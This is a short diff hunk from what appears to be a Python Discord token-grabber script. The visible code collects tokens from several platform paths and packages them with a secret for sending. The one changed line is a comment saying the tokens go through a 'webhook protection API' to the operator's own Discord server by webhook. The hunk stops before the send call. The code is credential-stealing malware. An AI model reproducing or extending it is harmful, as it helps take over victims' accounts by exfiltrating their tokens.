@@ -65,7 +65,7 @@ for platform, path in paths.items():
 
                 tokens.append(token)
 
-# send tokens to the webhook protection API
+# send tokens to the webhook protection API that will validate them and send them to your Discord server over webhook
 try:
     data = {'secret': SECRET, 'tokens': tokens}
 
